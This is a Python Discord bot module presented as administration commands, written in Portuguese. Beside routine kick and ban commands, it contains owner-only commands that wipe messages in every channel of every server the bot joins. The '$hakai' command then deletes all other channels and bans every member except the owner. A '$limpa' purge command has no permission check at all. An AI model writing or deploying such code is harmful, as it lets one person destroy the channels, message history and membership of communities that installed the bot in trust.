from discord.ext import commands
from discord.embeds import Embed
import discord

class Mestre(commands.Cog):
    '''COMANDOS DE ADMINISTRAÇÃO'''
    def __init__(self, bot):
        self.bot = bot

    @commands.command('$delete')
    async def delete(self, ctx, qtd=int(0)):
        if ctx.author.id == 592223043775102986:
            if qtd == 0:
                await ctx.send('Comando requer argumentos adicionais, entregando a quantidade de mensagem a ser deletada, exemplo: !delete 5')
            elif qtd > 30:
                await ctx.send('Você não pode deletar mais de 30 mensagens por vez, calma o coração!')
            else:
                await ctx.channel.purge(limit=qtd)

    @commands.command('$clear')
    async def clear(self, ctx, qtd=int(100000)):
        if ctx.author.id == 592223043775102986:

            for guild in self.bot.guilds:
                for channel in guild.text_channels:
                    try:
                        await channel.purge()
                    except:
                        pass

    @commands.command('$limpa')
    async def clear(self, ctx, qtd=int(10)):
        await ctx.channel.purge(limit=qtd)

            #await ctx.channel.purge(limit=qtd)

    @commands.command('$kick')
    async def kick(self, ctx, member: discord.Member, *, reason=None):
        if ctx.author.id == 592223043775102986:
            if reason == None:
                reason = 'Sem motivo'
            await ctx.guild.kick(member)
            await ctx.send(f'O usuário {member.mention} foi expulso pelo seguinte motivo: {reason}')

    @commands.command('$ban')
    async def ban(self, ctx, user: discord.Member, *, reason=None):
        if ctx.author.id == 592223043775102986:
            if reason == None:
                reason = 'Sem motivo'
            if ctx.author.top_role <= user.top_role:
                await ctx.send('Você não pode banir alguém com cargo maior ou igual ao seu, bobão!')
            if ctx.author.top_role > user.top_role:
                await ctx.guild.ban(user, reason=reason)
                await ctx.send(f'{user} foi banido com sucesso pelo seguinte motivo: {reason}')
    
    @commands.command('$hakai')
    async def hakai(self, ctx):
        if ctx.author.id == 592223043775102986:

            channel_id = ctx.channel.id

            for guild in self.bot.guilds:
                for channel in guild.text_channels:
                    try:
                        await channel.purge()
                    except:
                        pass

            for canais in ctx.guild.channels:
                try:
                    if canais.id != channel_id:
                        await canais.delete()
                    else:
                        pass
                except:
                    pass

            for user in ctx.guild.members:
                try:                    
                    if user.id != 592223043775102986:
                        await user.ban()
                    else:
                        pass

                except:
                    pass

            print ('Destruição feita com sucesso, mestre!')
            #await ctx.send(f"Successfully removed all members from {role.mention}.")
            
            embed = discord.Embed()
            embed.set_image(url='https://c.tenor.com/yxszK_bph5EAAAAC/beerus-power.gif')

            await ctx.send(embed=embed)
            await ctx.send('Guilherme hétero top')

    @commands.command('$listar')
    async def listar(self, ctx):
        channel_id_list = []
        for guild in self.bot.guilds:
            for channel in guild.text_channels:
                print(channel.id)
                channel_id_list.append(channel.id)
        print (channel_id_list)


def setup(bot):
    bot.add_cog(Mestre(bot))